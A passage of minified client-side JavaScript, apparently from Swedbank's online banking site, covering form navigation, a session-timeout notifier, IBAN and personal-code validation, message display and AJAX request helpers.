Promise(((resolve,reject)=>{null===cachedCountries?!Swedbank.isAuthenticated&&Swedbank.isLoggedIn||rest.performRequest(params).then((response=>{Swedbank.localStorage.set(storageKey,response,{expiresIn:"1 day"}),resolve(response)})).catch((err=>reject(err))):resolve(cachedCountries)}))}}}(Swedbank);var Navigate=function(){function setDynamicParameter($form,index,name,value){$form.field("field"+index).val(name),$form.field("value"+index).val(value)}function setParamValues(form,params){var index=0,$form=jQuery(form);jQuery.each(params,(function(name,value){index++,$form.field("field"+index).exists()||function createDynamicParameterFields(form,index){jQuery("<input/>",{type:"hidden",name:"field"+index}).appendTo(form),jQuery("<input/>",{type:"hidden",name:"value"+index}).appendTo(form)}($form,index),setDynamicParameter($form,index,name,value)}));for(var i=index+1;jQuery("#navForm").find('input[name="field'+i+'"]').exists();i++)setDynamicParameter($form,i,"","")}return{to:function(pageId,params,form){setPageId(form=form||document.navForm,pageId),setParamValues(form,params),form.submit()}}}();function navigateTo(pageId,paramName1,paramValue1,paramName2,paramValue2){null!=Swedbank.chatStartable&&(Swedbank.chatStartable=!1),setPageId(document.navForm,pageId),setParamNamesAndValues(document.navForm,paramName1,paramValue1,paramName2,paramValue2),document.navForm.submit()}function logout(){void 0!==Swedbank.virtualAssistant&&Swedbank.virtualAssistant.active&&Swedbank.communication.virtualAssistant.cleanUpVirtualAssistant("logout"),sessionStorage.clear(),document.navForm.action+="?forceLogout=true",handleLeasingRedirect(),navigateTo(null,"pageId","logout")}function doSubmitWithValidationAndDisable(event,trackingHandler){jQuery("#mainForm").valid()?(trackingHandler&&trackingHandler(),doSubmitWithDisable(event.target)):event.preventDefault()}function doSubmit(control,pageId,paramValue1,paramName2,paramValue2,target){var form=document.mainForm;if(saveFormState(form),setPageId(form,pageId),control&&control.name&&(form.field1.value=control.name,form.value1.value=paramValue1||"true"),paramName2?(form.field2.value=paramName2,form.value2.value=paramValue2):(form.field2.value="",form.value2.value=""),form.target=target||"",TimeoutNotifier.prolongSessionWithoutRequest(),form.onsubmit){var onsubmitResult=form.onsubmit();if(null!=onsubmitResult&&!onsubmitResult)return}form.submit(),restoreFormState(form),clearParams(form)}function doSubmitWithDisable(control){control instanceof jQuery&&(control=control[0]),"a"===control.localName?control.classList.add("disabled"):control.disabled="disabled",doSubmit.apply(this,Array.prototype.slice.apply(arguments))}function clearParams(form){form&&(form.field1&&(form.field1.value=""),form.value1&&(form.value1.value=""),form.field2&&(form.field2.value=""),form.value2&&(form.value2.value=""))}function setParamNamesAndValues(form,paramName1,paramValue1,paramName2,paramValue2){form.field1&&form.value1&&(paramName1?(form.field1.value=paramName1,form.value1.value=isEmpty(paramValue1)?paramName1:paramValue1):(form.field1.value="",form.value1.value="")),form.field2&&form.value2&&(paramName2?(form.field2.value=paramName2,form.value2.value=isEmpty(paramValue2)?paramName2:paramValue2):(form.field2.value="",form.value2.value=""))}function setPageId(form,pageId){if(pageId){form.pageId.value!=pageId&&(form.prevAction&&(form.prevAction.value=""),form.state&&(form.state.value="")),form.action=Hansa.action,form.pageId.value="";var newPath=pageId.replace(/\./g,"/"),hashId="",hashPos=newPath.indexOf("#");hashPos>=0&&(hashId=newPath.substring(hashPos),newPath=newPath.substring(0,hashPos));var sessionid="",sessionPos=form.action.indexOf(";");sessionPos>=0&&(sessionid=form.action.substring(sessionPos),form.action=form.action.substring(0,sessionPos)),form.action+=(form.action.endsWith("/")?"":"/")+newPath,form.action+=sessionid+hashId}}function getParamsForCalcPage(){var params={};function setElem(element){element&&(params[element.name]=element.value)}var form=document.mainForm;return setElem(form.pageId),setElem(form.securityId),setElem(form.attributesCheckNumber),setElem(form.encoding),setElem(form.language),setElem(form.serial),setElem(form.timestamp),setElem(form.state),params}function openCalculatorModal(pageId,preserveSession,extendedParams){var params=getParamsForCalcPage(),action=document.mainForm.action;params.pageId=pageId,params.selectedLoan=extendedParams?extendedParams.selectedLoan:null,!preserveSession&&action&&action.indexOf(";")>=0&&(action=action.substring(0,action.indexOf(";"))),Swedbank.UIModals.loadContent(params)}function navigate(source,pageId,paramName1,paramValue1,paramName2,paramValue2,anchor,target){var form=jQuery(source).closest("form")[0];null!=form&&runLinkAction(form,pageId,paramName1,paramValue1,paramName2,paramValue2,anchor,target)}function navLinkAction(pageId,sourcePageId,paramName1,paramValue1,paramName2,paramValue2,anchor,target){document.mainForm.sourcePageId&&(document.mainForm.sourcePageId.value=sourcePageId),"null"==sourcePageId&&(document.mainForm.sourcePageId.value=document.mainForm.pageId.value),runLinkAction(document.mainForm,pageId,paramName1,paramValue1,paramName2,paramValue2,anchor,target)}function openInNewWindow(pageId,bookmark){linkAction(pageId,"","","","",bookmark,"products")}function linkAction(pageId,paramName1,paramValue1,paramName2,paramValue2,anchor,target,targetOptions,width,height){document.mainForm.sourcePageId&&(document.mainForm.sourcePageId.value=""),runLinkAction(document.mainForm,pageId,paramName1,paramValue1,paramName2,paramValue2,anchor,target,targetOptions,width,height)}function linkActionWithDisable(button){button.disabled="disabled",linkAction.apply(this,Array.prototype.slice.apply(arguments,[1]))}function runLinkAction(form,pageId,paramName1,paramValue1,paramName2,paramValue2,anchor,target){saveFormState(form),setPageId(form,pageId),setParamNamesAndValues(form,paramName1,paramValue1,paramName2,paramValue2),setAnchor(form,anchor),target?(window.open("",target),form.target=target):form.target="",TimeoutNotifier.prolongSessionWithoutRequest(),form.submit()}function setAnchor(form,anchor){anchor&&(form.action+="#"+anchor)}var originalState=null;function saveFormState(form){null==originalState&&(originalState={target:form.target,pageId:form.pageId.value},form.state&&(originalState.state=form.state.value))}function restoreFormState(form){form.target=originalState.target,form.pageId.value=originalState.pageId,form.state&&(form.state.value=originalState.state)}function submitMainForm(){document.mainForm.submit()}function _fillForm(form,fields){var $form=jQuery(form),values=fields||{},fieldElements=[],getField=function(name){var field=$form.field(name);if(field.exists())return field;var $element=jQuery("<input/>",{name:name,type:"hidden"});return $element.appendTo($form),$element};for(var key in values)if(values.hasOwnProperty(key)){var $element=getField(key);$element.val(values[key]),fieldElements.push($element)}return fieldElements}function submitForm(form,pageId,fields){var additionalFields=fields||{},clearFields=arguments[3]||!1;setPageId(form,pageId);var fieldElements=_fillForm(form,additionalFields);form.submit(),clearFields&&fieldElements.forEach((function(field){field.clear()}))}function submitNavForm(pageId,fields){submitForm(document.navForm,pageId,fields)}function investorAppPage(pageId){return(Swedbank.Navigation.isPrivate()?"private.investor.":"business.invest.")+pageId}function addUrlParamsAndRedirect(pageId,paramName1,paramValue1,paramName2,paramValue2){if(Swedbank.isAuthenticated)linkAction(pageId,paramName1,paramValue1,paramName2,paramValue2);else{let url=new URL(window.location.origin+"/"+pageId.replaceAll(".","/"));url.searchParams.set(paramName1,paramValue1),void 0===paramName2&&void 0===paramValue2||url.searchParams.set(paramName2,paramValue2),url.searchParams.set("language",Swedbank.language),window.location.href=url}}function handleLeasingRedirect(){"vendornet"===getApplicationName()&&["confirm","agreements"].includes(document.navForm.pageId.value.split(".")[1])&&navigateTo("private.credit.leasing"+("LT"!==Swedbank.country?".car":""))}function setFieldValue(field,value){var $field=jQuery('[id="'+field+'"]');$field.exists()&&(null==value?"text"==$field.attr("type")||"textarea"==$field.attr("type")?$field.val(""):"select-one"==$field.attr("type")&&$field.prop("selectedIndex",0):$field.length>0&&$field.is(":radio")?$field.each((function(){var $element=jQuery(this);$element.val()==value&&$element.prop("checked",!0)})):$field.val(value))}function lookupByAttribute(jsonArray,attributeName,attributeValue,returnAttributeName){var foundObject=null;return jsonArray.forEach((function(jsonObject){jsonObject&&jsonObject[attributeName]==attributeValue&&(foundObject=jsonObject)})),foundObject?foundObject[returnAttributeName]:null}function ensureFieldExists(formIdOrObject,fieldId){var $form=getFormFromIdOrObject(formIdOrObject);$form.find([':input[name="'+fieldId+'"]',':input[id="'+fieldId+'"]'].join(",")).exists()||$form.prepend('<input name="'+fieldId+'" type="hidden" id="'+fieldId+'" value="">')}function safeSetFieldValue(formIdOrObject,fieldId,value,element){ensureFieldExists(formIdOrObject,fieldId);var $form=getFormFromIdOrObject(formIdOrObject),$element=jQuery(element),$field=$form.find(":input").filter('[id="'+fieldId+'"],[name="'+fieldId+'"]');$field.val(value),$element.is(":checkbox")&&$field.val($element.prop("checked")),$element.is(":radio")&&$field.val($element.filter(":checked").val())}function getFormFromIdOrObject(formIdOrObject){return formIdOrObject.id?jQuery("#"+formIdOrObject.id):jQuery("#"+formIdOrObject)}function copyOrSetFields(fromForm,toForm,fields){if("function"==typeof(fields=fields||[])&&(fields=fields()),Array.isArray(fields)){var $form=jQuery("#"+fromForm);jQuery(fields).each((function(){var $input=$form.find([':input[name="'+this+'"]',':input[id="'+this+'"]'].join(","));$input.exists()&&safeSetFieldValue(toForm,this,$input.val(),$input)}))}else jQuery.each(fields,(function(key,value){safeSetFieldValue(toForm,key,value)}))}function popup(){document.mainForm.popup.value="yes"}function isEmpty(val){return null==val||""==String(val).replace(/ /g,"")}function check_all(match,ref){if(document.mainForm){var $selectAllBox=jQuery(ref?"#"+ref:document.mainForm.select_all),$checkboxes=jQuery("#mainForm").find(":checkbox");match&&($checkboxes=$checkboxes.filter('[name="'+match+'"]')),$checkboxes.prop("checked",$selectAllBox.prop("checked"))}}function isValidAmount(amount){return amount=amount.trim(),/^\d+([,.]\d{0,2})?$/.test(amount)&&parseFloat(amount.replace(",","."))>0}var AccountNumber={isValidShort:function(accountNumber){return!(accountNumber.length<4||accountNumber.length>14)&&check731(accountNumber,!1)},isValidIBAN:function(accountNumber){return!(accountNumber.length<15||accountNumber.length>34||Number(accountNumber.substr(2,2))!=98-mod97(accountNumber.substr(4)+accountNumber.substr(0,2)+"00"))},isValidLocalIBAN:function(accountNumber){return AccountNumber.isValidIBAN(accountNumber)&&accountNumber.substr(0,2)==Swedbank.country},isValid:function(accountNumber){return"EE"==Swedbank.country?AccountNumber.isValidShort(accountNumber)||AccountNumber.isValidLocalIBAN(accountNumber)&&!isNaN(+accountNumber.substr(2)):"LT"==Swedbank.country?AccountNumber.isValidLocalIBAN(accountNumber)&&!isNaN(+accountNumber.substr(2)):AccountNumber.isValidLocalIBAN(accountNumber)},format:function(accountNumber){return accountNumber.replace(/\s/g,"").toUpperCase()},formatField:function(accountNumberField){accountNumberField.val(AccountNumber.format(accountNumberField.val()))}};function check731(number,charactersAllowed){null==charactersAllowed&&(charactersAllowed=!1);var value=number.replace(/^\s+|\s+$/g,"");if(value.length<2)return!1;for(var cleanedValue="",i=0;i<value.length;i++){var c=value.charAt(i);if(c>="0"&&c<="9")cleanedValue+=c;else if(!charactersAllowed)return!1}var weights=[1,7,3],sum=0;for(i=0;i<cleanedValue.length;sum+=cleanedValue.charAt(cleanedValue.length-i-1)*weights[i++%3]);return sum%10==0}function mod97(s){for(var mod=0,i=0;i<s.length;i++){var ch=s.charCodeAt(i);if(ch>=65&&ch<=90){var n=ch-65+10;mod=(10*(mod=(10*mod+Math.floor(n/10))%97)+n%10)%97}else ch>=48&&ch<=57&&(mod=(10*mod+(ch-48))%97)}return mod}Swedbank.RegistrationNumber={isValid:function(regNr){var num=Hansa.deleteWhitespaces(regNr);return!!/^\d{11}$/.test(num)&&Swedbank.RegistrationNumber.calculateCheckNumber(num)==num.substring(10,11)},getAge:function(regNr){var num=Hansa.deleteWhitespaces(regNr);return Swedbank.RegistrationNumber.isValid(num)?new PersonalCodeEE(num).getAge():null},calculateWeightRemainder:function(number,weights){return Swedbank.RegistrationNumber.calculateWeightsSum(number,weights)%11},calculateWeightsSum:function(number,weights){for(var sum=0,i=0;i<weights.length;i++)sum+=Number(number.substring(i,i+1))*weights[i];return sum},calculateCheckNumber:function(number){var remainder=Swedbank.RegistrationNumber.calculateWeightRemainder(number,[1,2,3,4,5,6,7,8,9,1]);return remainder<10?remainder:(10==remainder&&(remainder=Swedbank.RegistrationNumber.calculateWeightRemainder(number,[3,4,5,6,7,8,9,1,2,3])),remainder<10?remainder:0)}};var PersonalCodeEE=function(number){if(this.number=number,this.isValid()){var i=parseInt(number.substr(0,1)),centuryPrefix=17+(i%2+i)/2,year=number.substr(1,2),month=parseInt(number.substr(3,2),10),day=parseInt(number.substr(5,2),10);0!=month&&0!=day&&(this.birthday=new Date(centuryPrefix+year,month-1,day))}};function PersonalCodeLV(number){if(this.number=number,this.isValid()){var centuryPrefix=18+parseInt(number.substr(7,1),10),year=number.substr(4,2),month=parseInt(number.substr(2,2),10),day=parseInt(number.substr(0,2),10);0!=month&&0!=day&&(this.birthday=new Date(centuryPrefix+year,month-1,day))}}PersonalCodeEE.prototype.isValid=function(){var num=this.number;return!(!num||num.length<1||!/^\d{11}$/.test(num))&&this.calculateCheckNumber(num)==num.substring(10,11)},PersonalCodeEE.prototype.getAge=function(){if(this.birthday&&this.isValid()){var age=this._dateDiff(new Date,this.birthday)[0];return age<0?null:age}return null},PersonalCodeEE.prototype._dateDiff=function(start,end){var y1=start.getFullYear(),m1=start.getMonth(),d1=start.getDate(),y2=end.getFullYear(),m2=end.getMonth(),d2=end.getDate();return d1<d2&&(m1--,d1+=this._daysInMonth(y2,m2)),m1<m2&&(y1--,m1+=12),[y1-y2,m1-m2,d1-d2]},PersonalCodeEE.prototype._daysInMonth=function(year,month){with(new Date(year,month,1,12))return setDate(0),getDate()},PersonalCodeEE.prototype.calculateCheckNumber=function(number){return Swedbank.RegistrationNumber.calculateCheckNumber(number)},PersonalCodeLV.prototype.isValid=function(){if(!/^\d{6}-\d{5}/.test(this.number))return!1;var num=this.number.replace("-","");return!!(num&&num.trim()&&/^\d{11}$/.test(num))&&this.calculateCheckNumber(num)==num.substring(10,11)},PersonalCodeLV.prototype.getAge=function(){if(this.birthday&&this.isValid()){var age=this._dateDiff(new Date,this.birthday)[0];return age<0?null:age}return null},PersonalCodeLV.prototype._dateDiff=function(start,end){var y1=start.getFullYear(),m1=start.getMonth(),d1=start.getDate(),y2=end.getFullYear(),m2=end.getMonth(),d2=end.getDate();return d1<d2&&(m1--,d1+=this._daysInMonth(y2,m2)),m1<m2&&(y1--,m1+=12),[y1-y2,m1-m2,d1-d2]},PersonalCodeLV.prototype._daysInMonth=function(year,month){with(new Date(year,month,1,12))return setDate(0),getDate()},PersonalCodeLV.prototype.calculateCheckNumber=function(number){return(1101-Swedbank.RegistrationNumber.calculateWeightsSum(number,[1,6,3,7,9,10,5,8,4,2]))%11};const SB_SESSION_TIMEOUT_NOTIFIER_BLINK="SB_SESSION_TIMEOUT_NOTIFIER_BLINK";var TimeoutNotifier=function($,window,document,SharedComponents){var expirationIntervalId,expirationTimeoutId,notificationTimeoutId,secondsToExpiration,activityTimeout,self={},hasUserActivityListeners=!1,userActivityListenersActive=!0,throttle=SharedComponents.helpers.throttle,options={timeout:3e5,notificationRatio:.8,activityListenerRatio:.2,controller:{showNotification:function(seconds){},updateNotificationTimer:function(seconds){},generateHeadingMessage:function(seconds){}}};function clearTimeouts(){window.clearInterval(expirationIntervalId),window.clearTimeout(notificationTimeoutId),window.clearTimeout(expirationTimeoutId)}function initTimeoutNotification(){var sessionExpiredTimeout=options.timeout-options.timeout*options.notificationRatio;userActivityListenersActive&&self.bypassUserActivity(),secondsToExpiration=Math.round(sessionExpiredTimeout/1e3),expirationIntervalId=window.setInterval(updateNotificationTimer,1e3),expirationTimeoutId=window.setTimeout(closeChatAndShowSessionExpiredNotification,sessionExpiredTimeout),options.controller.showNotification(secondsToExpiration),options.controller.updateNotificationTimer(secondsToExpiration),Swedbank.Blinker.start(SB_SESSION_TIMEOUT_NOTIFIER_BLINK,Swedbank.Labels("continueSessionPageTitle"),!0)}function updateNotificationTimer(){--secondsToExpiration>0?options.controller.updateNotificationTimer(secondsToExpiration):(window.clearTimeout(expirationTimeoutId),closeChatAndShowSessionExpiredNotification())}function showSessionExpiredNotification(){$("#navForm").append('<input type="hidden" name="sessionExpirationReasonAjax" value="sessionExpired"/>'),self.expireSession()}function closeChatAndShowSessionExpiredNotification(){var controlsCallback={onFailure:showSessionExpiredNotification,onSuccess:showSessionExpiredNotification};Controls.executeControl("CommunicationControlContainer","CommunicationControl",{onLogOut:"true",rendererType:"JSON"},controlsCallback)}return self.setup=function(sessionTimeout,timeoutMessageController){sessionTimeout&&(options.timeout=sessionTimeout),timeoutMessageController&&(options.controller=timeoutMessageController),activityTimeout=options.timeout*options.activityListenerRatio,clearTimeouts(),notificationTimeoutId=window.setTimeout(initTimeoutNotification,options.timeout*options.notificationRatio),function initUserActivityListeners(){if(hasUserActivityListeners)return;var preventSessionTimeout=throttle((function(event){userActivityListenersActive&&self.prolongSession()}),activityTimeout,!0);hasUserActivityListeners=!0,document.addEventListener("mousemove",preventSessionTimeout,!1),document.addEventListener("click",preventSessionTimeout,!1),document.addEventListener("keypress",preventSessionTimeout,!1),document.addEventListener("touchmove",preventSessionTimeout,!1),window.addEventListener("scroll",preventSessionTimeout,!1),window.addEventListener("focus",preventSessionTimeout,!1)}()},self.prolongSession=function(){userActivityListenersActive||self.listenUserActivity(),makeAjaxRequest(document.mainForm,{pageId:"shared.ajaxResponse",refreshSession:!0},(function(){self.setup()}))},self.prolongSessionWithoutRequest=function(){Swedbank.isAuthenticated&&!0===Swedbank.isAuthenticated&&self.setup()},self.expireSession=function(){clearTimeouts(),logout()},self.listenUserActivity=function(){userActivityListenersActive=!0},self.bypassUserActivity=function(){userActivityListenersActive=!1},self}(jQuery,window,document,SharedComponents);Swedbank.SessionTimeoutNotifier=function($,window,eventBus){var modal,self={};self.setup=function(timeout){Swedbank.PageLoad.onFirst((function(){TimeoutNotifier.setup(timeout,controller)}))};var controller={showNotification:function(seconds){var message=this.generateHeadingMessage(seconds),ads=document.querySelector("#sessionModalAds");eventBus.dispatchCustomEvent("modal-open",{type:"confirmation",content:{title:message,description:Swedbank.Labels("sessionTimeoutNotificationDescription")},params:{attributes:{id:"modal-sessiontimeout",closable:!1,compact:!0,"label-decline":Swedbank.Labels("sessionTimeoutNotificationDecline"),"label-accept":Swedbank.Labels("sessionTimeoutNotificationAccept")},onAction:function(e){"accept"===e.detail.type?(Swedbank.Blinker.stop(SB_SESSION_TIMEOUT_NOTIFIER_BLINK),TimeoutNotifier.prolongSession(),this.close()):"decline"===e.detail.type&&(Swedbank.Blinker.stop(SB_SESSION_TIMEOUT_NOTIFIER_BLINK),TimeoutNotifier.expireSession(),this.close())}}}),(modal=document.querySelector("#modal-sessiontimeout")).querySelector("button.-accept").setAttribute("data-wt-label","continue-session"),modal.querySelector("button.-decline").setAttribute("data-wt-label","log-out"),ads&&(ads.style.display="block",modal.querySelector(".ui-modal__body").appendChild(ads))},updateNotificationTimer:function(seconds){var heading=modal&&modal.querySelector("h2"),message=this.generateHeadingMessage(seconds);heading&&(heading.innerHTML=message)},generateHeadingMessage:function(seconds){return[Swedbank.Labels("sessionTimeoutNotification"),"<em>"+seconds+"</em>",Swedbank.Labels("sessionTimeoutNotificationSeconds",seconds)].join(" ")}};return self}(jQuery,window,SharedComponents.eventBus);var ErrorMessage=new Message("errorMsg","#errorMessageBox","#errorMessage","#modalErrorMessagesContainer","#modalErrorMessage"),LoginErrorMessage=new Message("errorMsg","#loginErrorMessageBox","#loginErrorMessage","#modalLoginErrorMessagesContainer","#modalLoginErrorMessage"),WarningMessage=new Message("warningMsg","#pageWarningMessagesContainer","#warningMessage","#modalWarningMessagesContainer","#modalWarningMessage"),LoginWarningMessage=new Message("warningMsg","#login-warning","#login-warning-message","#modal-login","#modal-login-warning"),InfoMessage=new Message("infoMsg","#pageInfoMessagesContainer","#infoMessage","#modalInfoMessagesContainer","#modalInfoMessage"),LoginInfoMessage=new Message("infoMsg","#login-info","#login-info-message"),SuccessMessage=new Message("successMsg","#pageSuccessMessagesContainer","#successMessage","#modalSuccessMessagesContainer","#modalSuccessMessage"),UrgentMessage=new Message("urgentMsg","#login-info","#login-info-message");function Message(className,pageContainerId,pageElementId,modalContainerId,modalElementId){this.className=className,this.targets={page:{getContainer:function(){return jQuery(pageContainerId)},getElement:function(){return jQuery(pageElementId)},scrollTo:function(){setTimeout((function(){jQuery(pageContainerId).scrollTo(150,-10)}),50)}},modal:{getContainer:function(){return Swedbank.Modals.getActive().$.find(modalContainerId)},getElement:function(){return Swedbank.Modals.getActive().$.find(modalElementId)},scrollTo:function(){Swedbank.Modals.getActive().center()}},"ui-modal":{getContainer:function(){var modal=Swedbank.UIModals.getActive();if(modal)return jQuery(modal.querySelector(modalContainerId))},getElement:function(){var modal=Swedbank.UIModals.getActive();if(modal)return jQuery(modal.querySelector(modalElementId))},scrollTo:function(){}}},this.set=function(message,forcePageMessage){this.clear(forcePageMessage),this.add(message,forcePageMessage)},this.add=function(message,forcePageMessage){var messages=[].concat(message),that=this,target=this._getTarget(forcePageMessage);messages.filter((function(m){return!!m})).forEach((function(m){that._add(target,m)})),target.getContainer().show(),target.getElement().show()},this.removeMessage=function(message,forcePageMessage){this._getMessageElement(this._getTarget(forcePageMessage),message).remove(),this.isClear(forcePageMessage)&&this.clear(forcePageMessage)},this.toggleMessage=function(message,flag,forcePageMessage){flag?this.add(message,forcePageMessage):this.removeMessage(message,forcePageMessage)},this.clear=function(forcePageMessage){var target=this._getTarget(forcePageMessage);target.getContainer().hide(),target.getElement().html("")},this.isClear=function(forcePageMessage){return!this._getTarget(forcePageMessage).getElement().find("div").length},this.scrollTo=function(forcePageMessage){this._getTarget(forcePageMessage).scrollTo()},this._add=function(target,message){this._getMessageElement(target,message).length||target.getElement().append(this._wrapMessage(message))},this._getMessageElement=function(target,message){var wrappedMessageHtml=this._wrapMessage(message).html();return target.getElement().find("div").filter((function(){return jQuery(this).html()===wrappedMessageHtml}))},this._wrapMessage=function(message){if("ui-modal"===this._getTargetType()){var msg=UI.createElement({tagName:"ui-message",children:[message],attributes:{type:this._resolveUiMessageType(this.className)}});return jQuery(msg)}return jQuery("<div/>",{class:this.className,html:message})},this._getTarget=function(forcePageMessage){var target=this._getTargetType(forcePageMessage);return this.targets[target]},this._getTargetType=function(forcePageMessage){var activeModals=document.querySelectorAll("ui-modal.-active.-legacy");return!forcePageMessage&&Swedbank.Modals.getActive()?"modal":!forcePageMessage&&activeModals.length>0?"ui-modal":"page"},this._resolveUiMessageType=function(key){var types={infoMsg:"info",successMsg:"success",warningMsg:"warning",errorMsg:"error",urgentMsg:"urgent"};return types.hasOwnProperty(key)?types[key]:""}}var timeout=2e3,lastSubmitTime=0;function readyToSubmit(){return lastSubmitTime+timeout<=(new Date).getTime()}function setSubmitTime(){lastSubmitTime=(new Date).getTime()}function addBeforeSubmitHandlers(form){form&&!form.oldSubmitMethod&&(form.oldSubmitMethod=form.submit,form.submit=function(){return!!beforeSubmitHandler(this)&&(setSubmitTime(),this.oldSubmitMethod())})}function beforeSubmitHandler(form){return!!readyToSubmit()&&(form.timestamp&&(form.timestamp.value=(new Date).getTime()),!0)}var formSubmitWithEnterAllowed=!0;function disableFormSubmitWithEnter(){formSubmitWithEnterAllowed=!1}function enableFormSubmitWithEnter(){formSubmitWithEnterAllowed=!0}function registerKeypressHandlers(){jQuery(document).untilUnload("keydown","body, :input, :password, button",keyPressHandler)}function keyPressHandler(event){if(formSubmitWithEnterAllowed&&13===event.keyCode){var $mainForm=jQuery("#mainForm"),$defaultButton=$mainForm.find(".defaultFormButton");$defaultButton.length?$defaultButton.trigger("click"):$mainForm.find(":button, :submit").first().trigger("click")}}function checkVisibility(node){var $element=jQuery("string"==typeof node?"#"+node:node);return!$element.is(":visible")||!(!$element.is(":visible")||-1!==node.className.indexOf("yui-overlay"))&&(!node.parentNode||checkVisibility(node.parentNode))}var ERROR_INTERNET_CANNOT_CONNECT=12029,ERROR_INTERNET_CONNECTION_ABORTED=12030,ERROR_INTERNET_CONNECTION_RESET=12031,ERROR_CONNECTION=0;function pollWithCallbacks(form,successFunction,onGeneralError,onConnectionError){var request=makeAjaxRequest(form,jQuery(form).parseAsJSON(),successFunction);request.fail((function(){handleAjaxError(request.status,onGeneralError,onConnectionError)}))}function handleAjaxError(status,onGeneralError,onConnectionError){status==ERROR_INTERNET_CANNOT_CONNECT||status==ERROR_INTERNET_CONNECTION_ABORTED||status==ERROR_INTERNET_CONNECTION_RESET||status==ERROR_CONNECTION?onConnectionError():onGeneralError()}function getSessionParams(){var params={};function setIfExists(element){element&&(params[element.name]=element.value)}var form=document.mainForm;return setIfExists(form.pageId),setIfExists(form.securityId),setIfExists(form.attributesCheckNumber),setIfExists(form.encoding),setIfExists(form.language),setIfExists(form.serial),setIfExists(form.timestamp),setIfExists(form.state),params}function ajaxRequest(request,action){null==action&&(action=function(){});var params=jQuery.convertQueryParamsToObject(request);makeAjaxRequest(document.mainForm,params,(function(req){req.responseJSON&&req.responseJSON.exception?action(""):action(req.responseText)}))}function getRequestData(data){var additionalData=document.mainForm?window.getSessionParams():Swedbank.commonRequestParams;return Object.assign({},{request_timestamp:(new Date).toString()},additionalData,data)}function getRequestConfig(form,params,options){var requestData=getRequestData(params);return Object.assign({url:form&&form.action||Swedbank.Navigation.url,method:"POST",data:jQuery.param(requestData,!0)},options)}function makeAjaxRequest(form,params,onCompleteCallback,options){var requestConfig=getRequestConfig(form,params,options);return"function"==typeof onCompleteCallback&&(requestConfig.complete=function(request){void 0===params.withoutSessionProlong&&TimeoutNotifier.prolongSessionWithoutRequest(),onCompleteCallback.apply(this,[request])}),jQuery.ajax(requestConfig)}function makeAjaxRequestWithSuccessCallback(form,params){return new Promise((function(resolve,reject){var requestConfig=getRequestConfig(form,params);return requestConfig.success=function(request){void 0===params.withoutSessionProlong&&TimeoutNotifier.prolongSessionWithoutRequest(),resolve.apply(this,[request])},jQuery.ajax(requestConfig).fail(reject)}))}function validateUI(type,resolveElementRequireability,input,validatorResult){return"CHANGE_LIMIT"===type&&resolveElementRequireability(),[...document.querySelectorAll("#mainForm ui-field")].filter((field=>!field.classList.contains("-hidden"))).forEach((field=>{const controlId=field.getControlId();var input=field.querySelector(`[id="${controlId}"]`);(input&&!SharedComponents.FormValidator.validateField(input)||(input=field.control.querySelector("input"))&&!SharedComponents.FormValidator.validateField(input))&&(validatorResult=!1)})),validatorResult}function messagesRegexUrlProcess(agentMessage){for(var matchArr,linkRegex=new RegExp("<a.*?>.*?</a>","igm"),innerTextExp=new RegExp("<a [^>]*>(.*?)</a>","igm"),result=agentMessage,findHost=new RegExp("http(s|)://(.+?)/","im"),currentHost=findHost.exec(document.documentURI?document.documentURI.toString():location.href.toString())[2];null!=(matchArr=linkRegex.exec(agentMessage));){var strMatch=matchArr[0],removeJSessionId=new RegExp("(<a.*?>.+?);jsessionid=.*?(</a>)","im"),replacement=strMatch.replace(removeJSessionId,"$1$2"),incomingHostMatch=findHost.exec(matchArr[0]),incomingHost=incomingHostMatch&&incomingHostMatch[2]||null;if(null!==incomingHost&&currentHost.endsWith(incomingHost)){var changeLocalLinkToNavigateToCall=new RegExp('<a.*?href="http(s|)://.+?/(.+?)[\\s";].*?>',"im"),localPathMatch=changeLocalLinkToNavigateToCall.exec(matchArr[0]);if(localPathMatch&&localPathMatch.length>=3){var innerText=innerTextExp.exec(replacement)[1],localPath=changeLocalLinkToNavigateToCall.exec(matchArr[0])[2],paramsStart=(localPath=localPath.replace(/\//g,".").replace(/[\(\)'";]/g,"")).indexOf("?"),params="";-1!==paramsStart&&(params=(params=localPath.substring(paramsStart+1)).replace(/[=&]/g,"', '"),"."===(localPath=localPath.substring(0,paramsStart))[localPath.length-1]&&(localPath=localPath.substring(0,localPath.length-1))),replacement='<a href="{0}" title="{1}">{2}</a>'.format("javascript:navigateTo('"+localPath+"', '"+params+"')",innerText,incomingHost+"/...")}}else{var isNavigateToLink=!!replacement.match(/"javascript:navigateTo\('[^\)]+'\)"/);if(-1===replacement.indexOf('target="_blank"')&&!isNavigateToLink){var insertTargetBlankIfNone=new RegExp('(<a.*?)(target=".+?"|)(.*?)(>)',"im");replacement=replacement.replace(insertTargetBlankIfNone,'$1 target="_blank"$3$4')}var shortenVeryLongLinks=new RegExp("(<a.*?)>(http(s|)://.+?/)(.{50,})<","im");replacement=replacement.replace(shortenVeryLongLinks,'$1 title="$2$4">$2...<')}result=result.replace(strMatch,replacement)}return result}jQuery.ajaxSetup({traditional:!0}),HTMLFormElement.prototype.request=function(options){options=options||{};var params=this.serialize(!0),action=this.action||"",config={};if(!1===options.asynchronous&&(config.async=!1),action.trim()||(action=location.href),options.parameters){var additionalParams="string"==typeof options.parameters?options.parameters.toQueryParams():options.parameters;jQuery.extend(params,additionalParams)}return makeAjaxRequest({action:action},params,options.onSuccess||options.onComplete,config)},String.prototype.format=function(){var args=arguments;return this.replace(/\{(\d+)\}/g,(function(){return args[arguments[1]]}))},window.BankMessages=function(containerId,parameters){var container,exceptionsContainer,bankMessages={};function resolveElementRequireability(){const limitInputs=[...document.mainForm.querySelectorAll("#dailyLimit,#monthlyLimit")],hasAnyValue=limitInputs.some((input=>!!input.value.trim()));return limitInputs.forEach((input=>{input.required=!hasAnyValue;const field=input.closest("ui-field");field&&hasAnyValue?field.removeErrors(!0):SharedComponents.FormValidator.validateField(input)})),hasAnyValue}return bankMessages.init=function(){container=jQuery("#"+containerId),exceptionsContainer=container.find("div._exceptionsContainer"),bankMessages.initMessageTypeChange(),bankMessages.initAddressType(),bankMessages.initSendButton(),bankMessages.initCardsNotDelivered(),bankMessages.initCardHolders(),bankMessages.initChooseCards(),bankMessages.initLoanContractNumbers()},bankMessages.initCardsNotDelivered=function(){container.find("#cardsToReport").length>0&&(bankMessages.showOrHideAddress(),container.find("#cardsToReport").on("change",(function(){bankMessages.showOrHideAddress()})))},bankMessages.showOrHideAddress=function(){var 